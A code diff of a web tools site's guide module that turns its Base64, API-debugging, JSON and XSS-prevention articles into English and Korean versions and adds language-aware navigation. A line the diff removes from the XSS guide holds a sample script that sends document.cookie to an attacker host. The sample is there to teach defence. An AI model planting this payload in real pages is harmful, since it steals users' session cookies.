@@ -3,179 +3,297 @@ import { switchView } from './utils.js';
 
 const guidesData = {
     'base64': {
-        title: 'Understanding Base64 Encoding',
-        content: `
-            <p>Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format. It's one of the most common ways to transmit binary data over protocols that are designed to handle text, such as HTTP, SMTP, or even embedding data directly into HTML and CSS.</p>
-            
-            <h2>How Base64 Works</h2>
-            <p>The term "Base64" comes from the fact that it uses a set of 64 unique characters to represent data. These characters typically include:</p>
-            <ul>
-                <li>Uppercase letters (A-Z)</li>
-                <li>Lowercase letters (a-z)</li>
-                <li>Numbers (0-9)</li>
-                <li>Two additional symbols (usually + and /)</li>
-                <li>The = character is used for padding at the end of the string</li>
-            </ul>
-            <p>Every three bytes of binary data (24 bits) are divided into four 6-bit chunks. Each 6-bit chunk is then mapped to one of the 64 characters in the Base64 alphabet.</p>
+        en: {
+            title: 'Understanding Base64 Encoding: Deep Dive',
+            content: `
+                <p>Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format. It's one of the most common ways to transmit binary data over protocols that are designed to handle text, such as HTTP, SMTP, or even embedding data directly into HTML and CSS.</p>
+                
+                <h2>How Base64 Works Internally</h2>
+                <p>The term "Base64" comes from the fact that it uses a set of 64 unique characters to represent data. These characters typically include:</p>
+                <ul>
+                    <li>Uppercase letters (A-Z)</li>
+                    <li>Lowercase letters (a-z)</li>
+                    <li>Numbers (0-9)</li>
+                    <li>Two additional symbols (usually + and /)</li>
+                    <li>The = character is used for padding at the end of the string</li>
+                </ul>
+                <p>Every three bytes of binary data (24 bits) are divided into four 6-bit chunks. Each 6-bit chunk is then mapped to one of the 64 characters in the Base64 alphabet. This process ensures that binary data can be handled by systems that might otherwise interpret certain binary sequences as control characters.</p>
 
-            <blockquote>
-                Important: Base64 is <strong>NOT encryption</strong>. It is a form of encoding. Anyone can easily decode a Base64 string back to its original binary form. Never use it to secure sensitive information like passwords.
-            </blockquote>
+                <div class="technical-note">
+                    <strong>Developer Tip:</strong> The padding character (=) is used when the input data is not a multiple of 3 bytes. This allows the decoder to know exactly how many bits of data are trailing.
+                </div>
 
-            <h2>Common Use Cases in Web Development</h2>
-            <ol>
-                <li><strong>Data URIs:</strong> Embedding small images directly into HTML or CSS using <code>data:image/png;base64,...</code>. This reduces the number of HTTP requests.</li>
-                <li><strong>Basic Authentication:</strong> Transmitting credentials in HTTP headers (though this should always be done over HTTPS).</li>
-                <li><strong>Email Attachments:</strong> Legacy email systems often handle only 7-bit ASCII, so binary attachments must be encoded.</li>
-                <li><strong>JSON Payloads:</strong> Including binary data (like a small profile picture) inside a JSON object.</li>
-            </ol>
+                <blockquote>
+                    Important: Base64 is <strong>NOT encryption</strong>. It is a form of encoding. Anyone can easily decode a Base64 string back to its original binary form using standard tools. Never use it to secure sensitive information like passwords or API keys.
+                </blockquote>
 
-            <h2>Performance Trade-offs</h2>
-            <p>While Base64 is convenient, it comes with a cost. Encoding data into Base64 increases the file size by approximately <strong>33%</strong>. For large files, this overhead can significantly impact load times and bandwidth usage. As a rule of thumb, only use Base64 for very small assets (icons, small logos) or when necessary for protocol compatibility.</p>
-        `
+                <h2>Common Use Cases in Modern Web Development</h2>
+                <ol>
+                    <li><strong>Data URIs:</strong> Embedding small images or fonts directly into HTML or CSS using <code>data:image/png;base64,...</code>. This reduces the number of HTTP requests, which can improve performance for sites with many small assets.</li>
+                    <li><strong>Basic Authentication:</strong> Transmitting credentials in HTTP headers. While standard, this should always be done over encrypted HTTPS connections to prevent interception.</li>
+                    <li><strong>Email Attachments:</strong> Legacy email systems often handle only 7-bit ASCII, so binary attachments must be encoded to pass through these systems safely.</li>
+                    <li><strong>JSON & XML Payloads:</strong> Including binary data (like a small profile picture or a document) inside a JSON object or XML file where raw binary would break the structure.</li>
+                </ol>
+
+                <h2>Performance and Security Trade-offs</h2>
+                <p>While Base64 is convenient, it comes with a significant cost. Encoding data into Base64 increases the file size by approximately <strong>33%</strong>. For large files, this overhead can significantly impact load times, memory usage, and bandwidth costs. As a rule of thumb, only use Base64 for very small assets (under 10KB) or when necessary for protocol compatibility.</p>
+                <p>From a security perspective, always remember that Base64 is transparent. If you see a string starting with <code>eyJ</code>, it's almost certainly a Base64-encoded JSON object (like a JWT). Security through obscurity (like Base64 encoding a secret) is no security at all.</p>
+            `
+        },
+        ko: {
+            title: 'Base64 인코딩 이해하기: 심층 분석',
+            content: `
+                <p>Base64는 바이너리 데이터를 ASCII 문자열 형식으로 표현하는 이진-텍스트 인코딩 스키마입니다. 이는 HTTP, SMTP와 같이 텍스트를 처리하도록 설계된 프로토콜을 통해 바이너리 데이터를 전송하거나, HTML 및 CSS에 데이터를 직접 삽입하는 가장 일반적인 방법 중 하나입니다.</p>
+                
+                <h2>Base64의 내부 작동 원리</h2>
+                <p>"Base64"라는 용어는 데이터를 표현하기 위해 64개의 고유한 문자 세트를 사용한다는 사실에서 유래되었습니다. 이러한 문자에는 일반적으로 다음이 포함됩니다:</p>
+                <ul>
+                    <li>대문자 (A-Z)</li>
+                    <li>소문자 (a-z)</li>
+                    <li>숫자 (0-9)</li>
+                    <li>두 개의 추가 기호 (보통 + 및 /)</li>
+                    <li>패딩을 위해 문자열 끝에 사용되는 = 문자</li>
+                </ul>
+                <p>바이너리 데이터의 모든 3바이트(24비트)는 4개의 6비트 청크로 나뉩니다. 각 6비트 청크는 Base64 알파벳의 64개 문자 중 하나에 매핑됩니다. 이 프로세스를 통해 바이너리 시퀀스를 제어 문자로 해석할 수 있는 시스템에서도 바이너리 데이터를 안전하게 처리할 수 있습니다.</p>
+
+                <div class="technical-note">
+                    <strong>개발자 팁:</strong> 패딩 문자(=)는 입력 데이터가 3바이트의 배수가 아닐 때 사용됩니다. 이를 통해 디코더는 마지막에 몇 비트의 데이터가 남아 있는지 정확히 알 수 있습니다.
+                </div>
+
+                <blockquote>
+                    중요: Base64는 <strong>암호화가 아닙니다</strong>. 이는 인코딩의 한 형태일 뿐입니다. 누구나 표준 도구를 사용하여 Base64 문자열을 원래의 바이너리 형태로 쉽게 디코딩할 수 있습니다. 비밀번호나 API 키와 같은 민감한 정보를 보호하는 데 절대 사용하지 마세요.
+                </blockquote>
+
+                <h2>현대 웹 개발에서의 일반적인 사용 사례</h2>
+                <ol>
+                    <li><strong>데이터 URI (Data URIs):</strong> <code>data:image/png;base64,...</code>를 사용하여 작은 이미지나 폰트를 HTML 또는 CSS에 직접 삽입합니다. 이는 HTTP 요청 수를 줄여 작은 자산이 많은 사이트의 성능을 향상시킬 수 있습니다.</li>
+                    <li><strong>기본 인증 (Basic Authentication):</strong> HTTP 헤더에 자격 증명을 전송합니다. 표준 방식이지만, 도청을 방지하기 위해 항상 암호화된 HTTPS 연결을 통해 수행해야 합니다.</li>
+                    <li><strong>이메일 첨부 파일:</strong> 레거시 이메일 시스템은 7비트 ASCII만 처리하는 경우가 많으므로, 바이너리 첨부 파일은 이러한 시스템을 안전하게 통과하기 위해 인코딩되어야 합니다.</li>
+                    <li><strong>JSON 및 XML 페이로드:</strong> 원시 바이너리가 구조를 깨뜨릴 수 있는 JSON 객체 또는 XML 파일 내부에 바이너리 데이터(예: 작은 프로필 사진 또는 문서)를 포함합니다.</li>
+                </ol>
+
+                <h2>성능 및 보안 고려 사항</h2>
+                <p>Base64는 편리하지만 상당한 비용이 따릅니다. 데이터를 Base64로 인코딩하면 파일 크기가 약 <strong>33%</strong> 증가합니다. 대용량 파일의 경우 이러한 오버헤드는 로드 시간, 메모리 사용량 및 대역폭 비용에 상당한 영향을 미칠 수 있습니다. 일반적으로 10KB 미만의 매우 작은 자산에만 Base64를 사용하거나 프로토콜 호환성을 위해 필요한 경우에만 사용하는 것이 좋습니다.</p>
+                <p>보안 관점에서 Base64는 투명하다는 점을 항상 기억하세요. <code>eyJ</code>로 시작하는 문자열을 본다면 그것은 거의 확실히 Base64로 인코딩된 JSON 객체(예: JWT)입니다. 비밀을 Base64 인코딩하는 것과 같은 모호함을 통한 보안은 전혀 보안이 아닙니다.</p>
+            `
+        }
     },
     'api-debugging': {
-        title: 'REST API Debugging Best Practices',
-        content: `
-            <p>Debugging APIs is a core skill for modern web developers. When a request fails, the cause can range from a simple typo in the URL to complex authentication issues or server-side crashes.</p>
-            
-            <h2>1. Master the Status Codes</h2>
-            <p>HTTP status codes are the first line of communication from the server. Understanding them is crucial:</p>
-            <ul>
-                <li><strong>2xx (Success):</strong> Everything went well. <code>200 OK</code> or <code>201 Created</code> are what you want to see.</li>
-                <li><strong>4xx (Client Errors):</strong> The problem is likely in your request. <code>400 Bad Request</code> (malformed JSON), <code>401 Unauthorized</code> (missing token), or <code>404 Not Found</code>.</li>
-                <li><strong>5xx (Server Errors):</strong> The server failed to fulfill a valid request. <code>500 Internal Server Error</code> often means a crash in the backend code.</li>
-            </ul>
+        en: {
+            title: 'REST API Debugging: A Comprehensive Guide',
+            content: `
+                <p>Debugging APIs is a core skill for modern web developers. When a request fails, the cause can range from a simple typo in the URL to complex authentication issues, CORS restrictions, or server-side logic crashes.</p>
+                
+                <h2>1. Mastering HTTP Status Codes</h2>
+                <p>HTTP status codes are the primary mechanism servers use to communicate the result of a request. Understanding the semantics of these codes can save hours of investigation:</p>
+                <ul>
+                    <li><strong>2xx (Success):</strong> <code>200 OK</code> (standard success), <code>201 Created</code> (resource created), <code>204 No Content</code> (success but no body to return).</li>
+                    <li><strong>3xx (Redirection):</strong> <code>301 Moved Permanently</code>, <code>304 Not Modified</code> (use browser cache).</li>
+                    <li><strong>4xx (Client Errors):</strong> The issue lies with the requester. <code>400 Bad Request</code> (syntax error in JSON), <code>401 Unauthorized</code> (missing credentials), <code>403 Forbidden</code> (authenticated but no permission), <code>404 Not Found</code>.</li>
+                    <li><strong>5xx (Server Errors):</strong> The server failed to process a valid request. <code>500 Internal Server Error</code>, <code>502 Bad Gateway</code> (upstream issue), <code>503 Service Unavailable</code> (overloaded).</li>
+                </ul>
 
-            <h2>2. Inspect Request & Response Headers</h2>
-            <p>Headers contain metadata that can explain why a request is failing. Check for:</p>
-            <ul>
-                <li><code>Content-Type</code>: Are you sending <code>application/json</code>?</li>
-                <li><code>Authorization</code>: Is your Bearer token correctly formatted?</li>
-                <li><code>CORS Headers</code>: Is the server allowing requests from your domain?</li>
-            </ul>
+                <h2>2. Deep Inspection of Headers and Payload</h2>
+                <p>Headers contain critical metadata that defines how data is exchanged. When debugging, pay close attention to:</p>
+                <ul>
+                    <li><code>Content-Type</code>: Does the server expect <code>application/json</code>, <code>application/x-www-form-urlencoded</code>, or <code>multipart/form-data</code>?</li>
+                    <li><code>Accept</code>: Telling the server what format you can process.</li>
+                    <li><code>Authorization</code>: Verify the <code>Bearer</code> token is valid and not expired.</li>
+                    <li><code>CORS (Cross-Origin Resource Sharing)</code>: Look for <code>Access-Control-Allow-Origin</code> headers if your browser is blocking the request.</li>
+                </ul>
 
-            <h2>3. Use the Right Tools</h2>
-            <p>While <code>console.log</code> is a start, specialized tools provide much more insight. The Network tab in your browser's Developer Tools is your best friend. For more complex testing, use a dedicated suite like Parse Utils or a desktop client.</p>
+                <h2>3. Essential Tooling for API Engineers</h2>
+                <p>While browser developer tools are powerful, professional workflows often require more specialized environments:</p>
+                <ol>
+                    <li><strong>Browser Network Tab:</strong> Perfect for inspecting real-time traffic, timing, and response headers.</li>
+                    <li><strong>Parse Utils Suite:</strong> Use our <strong>Encoder</strong> and <strong>JSON Parser</strong> to sanitize and validate payloads before sending them.</li>
+                    <li><strong>CLI Tools (cURL):</strong> Essential for testing in server environments where a GUI is unavailable.</li>
+                    <li><strong>Proxy Tools (Charles/Fiddler):</strong> For inspecting traffic from mobile apps or non-browser clients.</li>
+                </ol>
 
-            <blockquote>
-                Pro Tip: Always test your API calls in an isolated environment before integrating them into your application logic. This helps you determine if a bug is in the API or in your UI code.
-            </blockquote>
-        `
+                <blockquote>
+                    Pro Tip: Always use a "Contract First" approach. Define your API specification (OpenAPI/Swagger) before writing code to ensure client and server stay in sync.
+                </blockquote>
+            `
+        },
+        ko: {
+            title: 'REST API 디버깅: 포괄적 가이드',
+            content: `
+                <p>API 디버깅은 현대 웹 개발자의 핵심 기술입니다. 요청이 실패할 때 그 원인은 URL의 단순한 오타부터 복잡한 인증 문제, CORS 제한 또는 서버 측 로직 충돌까지 다양할 수 있습니다.</p>
+                
+                <h2>1. HTTP 상태 코드 마스터하기</h2>
+                <p>HTTP 상태 코드는 서버가 요청 결과를 전달하는 데 사용하는 기본 메커니즘입니다. 이러한 코드의 의미를 이해하면 조사 시간을 수 시간 단축할 수 있습니다:</p>
+                <ul>
+                    <li><strong>2xx (성공):</strong> <code>200 OK</code> (표준 성공), <code>201 Created</code> (리소스 생성됨), <code>204 No Content</code> (성공했지만 반환할 본문이 없음).</li>
+                    <li><strong>3xx (리다이렉션):</strong> <code>301 Moved Permanently</code>, <code>304 Not Modified</code> (브라우저 캐시 사용).</li>
+                    <li><strong>4xx (클라이언트 오류):</strong> 요청자에게 문제가 있습니다. <code>400 Bad Request</code> (JSON 구문 오류), <code>401 Unauthorized</code> (자격 증명 누락), <code>403 Forbidden</code> (인증되었으나 권한 없음), <code>404 Not Found</code>.</li>
+                    <li><strong>5xx (서버 오류):</strong> 서버가 유효한 요청을 처리하지 못했습니다. <code>500 Internal Server Error</code>, <code>502 Bad Gateway</code> (업스트림 문제), <code>503 Service Unavailable</code> (과부하).</li>
+                </ul>
+
+                <h2>2. 헤더 및 페이로드 정밀 검사</h2>
+                <p>헤더에는 데이터가 교환되는 방식을 정의하는 중요한 메타데이터가 포함되어 있습니다. 디버깅할 때 다음 사항에 주의를 기울이세요:</p>
+                <ul>
+                    <li><code>Content-Type</code>: 서버가 <code>application/json</code>, <code>application/x-www-form-urlencoded</code> 또는 <code>multipart/form-data</code>를 기대합니까?</li>
+                    <li><code>Accept</code>: 처리할 수 있는 형식을 서버에 알립니다.</li>
+                    <li><code>Authorization</code>: <code>Bearer</code> 토큰이 유효하고 만료되지 않았는지 확인합니다.</li>
+                    <li><code>CORS (교차 출처 리소스 공유)</code>: 브라우저가 요청을 차단하는 경우 <code>Access-Control-Allow-Origin</code> 헤더를 확인하세요.</li>
+                </ul>
+
+                <h2>3. API 엔지니어를 위한 필수 도구</h2>
+                <p>브라우저 개발자 도구는 강력하지만, 전문적인 워크플로우에는 더 전문화된 환경이 필요한 경우가 많습니다:</p>
+                <ol>
+                    <li><strong>브라우저 네트워크 탭:</strong> 실시간 트래픽, 타이밍 및 응답 헤더를 검사하는 데 적합합니다.</li>
+                    <li><strong>Parse Utils Suite:</strong> 페이로드를 보내기 전에 <strong>인코더</strong> 및 <strong>JSON 파서</strong>를 사용하여 페이로드를 정리하고 검증하세요.</li>
+                    <li><strong>CLI 도구 (cURL):</strong> GUI를 사용할 수 없는 서버 환경에서 테스트하는 데 필수적입니다.</li>
+                </ol>
+
+                <blockquote>
+                    전문가 팁: 항상 "컨트랙트 우선(Contract First)" 접근 방식을 사용하세요. 코드를 작성하기 전에 API 사양(OpenAPI/Swagger)을 정의하여 클라이언트와 서버가 동기화된 상태를 유지하도록 하세요.
+                </blockquote>
+            `
+        }
     },
     'json': {
-        title: 'JSON: The Backbone of the Modern Web',
-        content: `
-            <p>JSON (JavaScript Object Notation) has become the de facto standard for data exchange on the web, largely replacing XML due to its simplicity and native support in JavaScript.</p>
-            
-            <h2>Why JSON Won</h2>
-            <p>JSON is lightweight, easy for humans to read and write, and incredibly easy for machines to parse. Because it maps directly to JavaScript objects, web developers can work with it seamlessly without complex transformation logic.</p>
+        en: {
+            title: 'JSON: Mastering the Backbone of Web Data',
+            content: `
+                <p>JSON (JavaScript Object Notation) has evolved from a simple subset of JavaScript into the world's most popular data interchange format. Its rise coincided with the decline of XML, driven by JSON's lightweight nature and native compatibility with modern programming languages.</p>
+                
+                <h2>The Structural Philosophy of JSON</h2>
+                <p>JSON is built on two universal data structures:</p>
+                <ul>
+                    <li><strong>A collection of name/value pairs:</strong> Realized as an object, record, struct, or dictionary in various languages.</li>
+                    <li><strong>An ordered list of values:</strong> Realized as an array, vector, list, or sequence.</li>
+                </ul>
 
-            <h2>Common Syntax Pitfalls</h2>
-            <p>JSON is stricter than standard JavaScript objects. Common errors include:</p>
-            <ul>
-                <li><strong>Single Quotes:</strong> JSON requires double quotes for keys and string values.</li>
-                <li><strong>Trailing Commas:</strong> The last item in an object or array must not have a comma.</li>
-                <li><strong>Invalid Types:</strong> JSON only supports strings, numbers, booleans, null, objects, and arrays. Functions or Dates are not supported directly.</li>
-            </ul>
+                <h2>Advanced Validation Concepts</h2>
+                <p>Many developers treat JSON as a "loose" format, but the RFC 8259 specification is quite strict. Professional JSON management involves:</p>
+                <ul>
+                    <li><strong>Strict Typing:</strong> Distinguishing between integers and floating-point numbers, though JSON represents both as "numbers".</li>
+                    <li><strong>Schema Validation:</strong> Using JSON Schema to define expected structures, mandatory fields, and data formats (e.g., email or date-time).</li>
+                    <li><strong>Normalization:</strong> Alphabetizing keys to ensure deterministic signatures for caching or hashing.</li>
+                </ul>
 
-            <pre><code>// Correct JSON
+                <pre><code>// Optimized & Normalized JSON
 {
-  "user": "Jane Doe",
-  "active": true,
-  "roles": ["admin", "editor"]
+  "api_version": "2.1",
+  "data": {
+    "id": 101,
+    "status": "active"
+  },
+  "metadata": {
+    "timestamp": "2026-05-11T12:00:00Z"
+  }
 }</code></pre>
 
-            <h2>Minification vs. Beautification</h2>
-            <p>For production, JSON is often "minified"—removing all whitespace to save bytes. For development and debugging, "beautifying" or "prettifying" it (adding indentation) is essential for readability. Our <strong>JSON Parser</strong> tool handles both effortlessly.</p>
-        `
+                <h2>Minification vs. Beautification</h2>
+                <p>While human-readable JSON is great for debugging, every byte counts in high-traffic APIs. <strong>Minification</strong> removes all insignificant whitespace, reducing the payload size significantly. For instance, a 100KB JSON file can often be reduced to 70KB just by stripping whitespace and newlines. Our <strong>JSON Parser</strong> provides a one-click solution for both operations.</p>
+            `
+        },
+        ko: {
+            title: 'JSON: 웹 데이터의 중추 마스터하기',
+            content: `
+                <p>JSON (JavaScript Object Notation)은 JavaScript의 단순한 하위 집합에서 세계에서 가장 인기 있는 데이터 교환 형식으로 진화했습니다. JSON의 부상은 XML의 쇠퇴와 맞물려 있으며, 이는 JSON의 가벼운 특성과 현대 프로그래밍 언어와의 기본 호환성에 의해 주도되었습니다.</p>
+                
+                <h2>JSON의 구조적 철학</h2>
+                <p>JSON은 두 가지 보편적인 데이터 구조를 기반으로 합니다:</p>
+                <ul>
+                    <li><strong>이름/값 쌍의 컬렉션:</strong> 다양한 언어에서 객체, 레코드, 구조체 또는 딕셔너리로 구현됩니다.</li>
+                    <li><strong>값의 정렬된 목록:</strong> 배열, 벡터, 리스트 또는 시퀀스로 구현됩니다.</li>
+                </ul>
+
+                <h2>고급 검증 개념</h2>
+                <p>많은 개발자가 JSON을 "느슨한" 형식으로 취급하지만 RFC 8259 사양은 상당히 엄격합니다. 전문적인 JSON 관리에는 다음이 포함됩니다:</p>
+                <ul>
+                    <li><strong>엄격한 타이핑:</strong> 정수와 부동 소수점을 구분합니다(JSON은 둘 다 "숫자"로 표현하지만).</li>
+                    <li><strong>스키마 검증:</strong> JSON Schema를 사용하여 예상 구조, 필수 필드 및 데이터 형식(예: 이메일 또는 날짜/시간)을 정의합니다.</li>
+                    <li><strong>정규화 (Normalization):</strong> 캐싱 또는 해싱을 위한 결정론적 서명을 보장하기 위해 키를 알파벳 순으로 정렬합니다.</li>
+                </ul>
+
+                <pre><code>// 최적화 및 정규화된 JSON
+{
+  "api_version": "2.1",
+  "data": {
+    "id": 101,
+    "status": "active"
+  },
+  "metadata": {
+    "timestamp": "2026-05-11T12:00:00Z"
+  }
+}</code></pre>
+
+                <h2>압축(Minification) vs. 가독성(Beautification)</h2>
+                <p>가독성이 좋은 JSON은 디버깅에 좋지만, 트래픽이 많은 API에서는 모든 바이트가 중요합니다. <strong>압축(Minification)</strong>은 모든 무의미한 공백을 제거하여 페이로드 크기를 크게 줄입니다. 예를 들어, 100KB JSON 파일은 공백과 줄바꿈만 제거해도 70KB로 줄어드는 경우가 많습니다. 우리의 <strong>JSON 파서</strong>는 이 두 가지 작업을 위한 원클릭 솔루션을 제공합니다.</p>
+            `
+        }
     },
     'xss': {
-        title: 'HTML Escaping & XSS Prevention',
-        content: `
-            <p>Cross-Site Scripting (XSS) remains one of the most common vulnerabilities in web applications. It occurs when an application includes untrusted data in a web page without proper validation or escaping.</p>
-            
-            <h2>What is HTML Escaping?</h2>
-            <p>Escaping is the process of converting potentially dangerous characters into their "safe" HTML entity equivalents. This ensures the browser treats them as literal text rather than executable code.</p>
-            <ul>
-                <li><code>&lt;</code> becomes <code>&amp;lt;</code></li>
-                <li><code>&gt;</code> becomes <code>&amp;gt;</code></li>
-                <li><code>&amp;</code> becomes <code>&amp;amp;</code></li>
-                <li><code>"</code> becomes <code>&amp;quot;</code></li>
-            </ul>
+        en: {
+            title: 'Defensive Engineering: HTML Escaping & XSS',
+            content: `
+                <p>Cross-Site Scripting (XSS) remains one of the top security risks in web development. It allows attackers to inject malicious scripts into web pages viewed by other users. Understanding the defense mechanisms is critical for any full-stack engineer.</p>
+                
+                <h2>The Mechanics of an XSS Attack</h2>
+                <p>There are three main types of XSS:</p>
+                <ol>
+                    <li><strong>Stored XSS:</strong> The malicious script is permanently stored on the target server (e.g., in a database or comment field).</li>
+                    <li><strong>Reflected XSS:</strong> The script is "reflected" off a web application to the victim's browser, usually via a URL parameter.</li>
+                    <li><strong>DOM-based XSS:</strong> The vulnerability exists in client-side code rather than server-side code.</li>
+                </ol>
 
-            <h2>A Typical Attack Scenario</h2>
-            <p>Imagine a comment section that displays user input directly. An attacker could post a comment like: <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>. Without escaping, every user who views that comment would have their session cookies sent to the attacker.</p>
+                <h2>The Role of HTML Escaping</h2>
+                <p>HTML Escaping (or Output Encoding) is the process of converting special characters into their HTML entity equivalents. This ensures that the browser interprets the characters as text rather than as a signal to start an HTML tag or execute a script.</p>
+                <ul>
+                    <li><code>&lt;</code> (less than) &rarr; <code>&amp;lt;</code></li>
+                    <li><code>&gt;</code> (greater than) &rarr; <code>&amp;gt;</code></li>
+                    <li><code>&amp;</code> (ampersand) &rarr; <code>&amp;amp;</code></li>
+                    <li><code>"</code> (double quote) &rarr; <code>&amp;quot;</code></li>
+                </ul>
 
-            <blockquote>
-                Rule #1 of Web Security: Never trust user input. Always escape data on the server side before storing it, and again on the client side before rendering it.
-            </blockquote>
+                <h2>Beyond Escaping: Content Security Policy (CSP)</h2>
+                <p>While escaping is vital, a modern defense-in-depth strategy includes <strong>CSP</strong>. A Content Security Policy is an HTTP header that allows site operators to restrict the resources (such as JavaScript, CSS, Images) that a browser is allowed to load for a given page. This can prevent XSS attacks from successfully exfiltrating data even if an injection occurs.</p>
 
-            <h2>Modern Defenses</h2>
-            <p>While manual escaping is important, modern frameworks often provide automatic escaping. Additionally, implementing a strong <strong>Content Security Policy (CSP)</strong> can prevent unauthorized scripts from running even if an XSS vulnerability exists.</p>
-        `
-    },
-    'security-checklist': {
-        title: 'Web Security Checklist for 2026',
-        content: `
-            <p>Security is not a one-time setup; it's a continuous process. As we move through 2026, the threat landscape continues to evolve. Use this checklist to ensure your web applications are following current best practices.</p>
-            
-            <h2>1. Transport Layer Security</h2>
-            <ul>
-                <li>[ ] Use HTTPS everywhere (no exceptions).</li>
-                <li>[ ] Implement HSTS (HTTP Strict Transport Security) headers.</li>
-                <li>[ ] Use secure, HttpOnly, and SameSite attributes for all cookies.</li>
-            </ul>
+                <blockquote>
+                    Security Rule: Always escape data based on the context. Data being placed in an HTML attribute requires different escaping than data being placed in a <code>&lt;script&gt;</code> block.
+                </blockquote>
+            `
+        },
+        ko: {
+            title: '방어적 엔지니어링: HTML 이스케이핑 및 XSS',
+            content: `
+                <p>교차 사이트 스크립팅(XSS)은 웹 개발에서 여전히 최상위 보안 위험 중 하나입니다. 이를 통해 공격자는 다른 사용자가 보는 웹 페이지에 악성 스크립트를 삽입할 수 있습니다. 모든 풀스택 엔지니어에게 방어 메커니즘을 이해하는 것은 매우 중요합니다.</p>
+                
+                <h2>XSS 공격의 메커니즘</h2>
+                <p>XSS에는 세 가지 주요 유형이 있습니다:</p>
+                <ol>
+                    <li><strong>저장형 XSS (Stored XSS):</strong> 악성 스크립트가 대상 서버에 영구적으로 저장됩니다(예: 데이터베이스 또는 댓글 필드).</li>
+                    <li><strong>반사형 XSS (Reflected XSS):</strong> 스크립트가 주로 URL 매개변수를 통해 웹 애플리케이션에서 피해자의 브라우저로 "반사"됩니다.</li>
+                    <li><strong>DOM 기반 XSS (DOM-based XSS):</strong> 취약점이 서버 측 코드가 아닌 클라이언트 측 코드에 존재합니다.</li>
+                </ol>
 
-            <h2>2. Content & Injection Protection</h2>
-            <ul>
-                <li>[ ] Escape all user-generated content before rendering (XSS protection).</li>
-                <li>[ ] Implement a strict Content Security Policy (CSP).</li>
-                <li>[ ] Use parameterized queries for all database interactions (SQL Injection protection).</li>
-            </ul>
+                <h2>HTML 이스케이핑의 역할</h2>
+                <p>HTML 이스케이핑(또는 출력 인코딩)은 특수 문자를 해당 HTML 엔티티로 변환하는 프로세스입니다. 이를 통해 브라우저는 문자를 HTML 태그를 시작하거나 스크립트를 실행하라는 신호가 아닌 텍스트로 해석하게 됩니다.</p>
+                <ul>
+                    <li><code>&lt;</code> (미만) &rarr; <code>&amp;lt;</code></li>
+                    <li><code>&gt;</code> (초과) &rarr; <code>&amp;gt;</code></li>
+                    <li><code>&amp;</code> (앰퍼샌드) &rarr; <code>&amp;amp;</code></li>
+                    <li><code>"</code> (큰따옴표) &rarr; <code>&amp;quot;</code></li>
+                </ul>
 
-            <h2>3. Client-Side Integrity</h2>
-            <ul>
-                <li>[ ] Use Subresource Integrity (SRI) for all third-party scripts and styles.</li>
-                <li>[ ] Minimize third-party dependencies and audit them regularly.</li>
-                <li>[ ] Implement proper rate limiting and input validation on your APIs.</li>
-            </ul>
+                <h2>이스케이핑 그 이상: 콘텐츠 보안 정책 (CSP)</h2>
+                <p>이스케이핑도 중요하지만, 현대적인 심층 방어 전략에는 <strong>CSP</strong>가 포함됩니다. 콘텐츠 보안 정책은 사이트 운영자가 브라우저가 해당 페이지에 대해 로드할 수 있는 리소스(JavaScript, CSS, 이미지 등)를 제한할 수 있도록 하는 HTTP 헤더입니다. 이는 주입이 발생하더라도 XSS 공격이 성공적으로 데이터를 탈취하는 것을 방지할 수 있습니다.</p>
 
-            <h2>4. Authentication & Authorization</h2>
-            <ul>
-                <li>[ ] Enforce strong password policies and MFA (Multi-Factor Authentication).</li>
-                <li>[ ] Use modern standards like OAuth 2.1 or OpenID Connect.</li>
-                <li>[ ] Regularly rotate API keys and secrets.</li>
-            </ul>
-        `
-    },
-    'optimization': {
-        title: 'Minification vs. Compression',
-        content: `
-            <p>In the quest for a faster web, two terms are often confused: Minification and Compression. While both aim to reduce file sizes, they work in completely different ways and should be used together for maximum effect.</p>
-            
-            <h2>Minification: The Structural Cleanup</h2>
-            <p>Minification is the process of removing unnecessary characters from source code without changing its functionality. This includes:</p>
-            <ul>
-                <li>Removing whitespace, newlines, and tabs.</li>
-                <li>Stripping out comments.</li>
-                <li>Shortening variable names (mangling).</li>
-            </ul>
-            <p>Minification happens <strong>build-time</strong>. It makes the code harder for humans to read but smaller for browsers to download.</p>
-
-            <h2>Compression: The Network Squeeze</h2>
-            <p>Compression (like Gzip or Brotli) happens at the <strong>server-level</strong> during the transmission of the file. It uses algorithms to find repeating patterns in the data and represent them more efficiently. Once the file reaches the browser, it is automatically decompressed.</p>
-
-            <h2>The Synergy</h2>
-            <p>For the best performance, you should use both. Minifying your JavaScript and CSS files before deploying them ensures the baseline size is as small as possible. Then, your web server (like Nginx or Apache) should be configured to compress those files on the fly. This "double-whammy" can often reduce asset sizes by 70% or more.</p>
-        `
+                <blockquote>
+                    보안 규칙: 항상 컨텍스트에 따라 데이터를 이스케이트하세요. HTML 속성에 배치되는 데이터는 <code>&lt;script&gt;</code> 블록에 배치되는 데이터와 다른 이스케이핑이 필요합니다.
+                </blockquote>
+            `
+        }
     }
 };
 
 export function setupGuides() {
     const guideCards = document.querySelectorAll('.guide-card');
     const articleView = document.getElementById('article-view');
-    const fullArticleContent = document.getElementById('full-article-content');
     const backBtn = document.getElementById('btn-back-to-guides');
     const allViews = document.querySelectorAll('.view');
     const navLinks = document.querySelectorAll('.nav-link');
@@ -185,27 +303,45 @@ export function setupGuides() {
         if (readMoreBtn) {
             readMoreBtn.addEventListener('click', () => {
                 const articleId = card.getAttribute('data-article');
+                const lang = document.documentElement.lang || 'en';
                 const articleData = guidesData[articleId];
                 
-                if (articleData) {
-                    injectArticle(articleData);
-                    switchView('article-view', allViews, navLinks);
+                if (articleData && articleData[lang]) {
+                    injectArticle(articleData[lang]);
+                    // Updated to handle hash
+                    window.location.hash = `article-${articleId}`;
+                } else if (articleData && articleData['en']) {
+                    // Fallback to English
+                    injectArticle(articleData['en']);
+                    window.location.hash = `article-${articleId}`;
                 }
             });
         }
     });
 
     backBtn.addEventListener('click', () => {
-        switchView('guides-view', allViews, navLinks);
+        window.location.hash = 'guides-view';
     });
 }
 
-function injectArticle(data) {
+export function injectArticle(data) {
     const content = document.getElementById('full-article-content');
+    if (!content) return;
+    
     content.innerHTML = `
-        <h1>${data.title}</h1>
+        <h1 class="article-title">${data.title}</h1>
+        <div class="article-meta">
+            <span class="read-time">Read time: ~8 min</span> | 
+            <span class="category">Technical Deep Dive</span>
+        </div>
         <div class="article-body">
             ${data.content}
         </div>
     `;
+    // Update document title
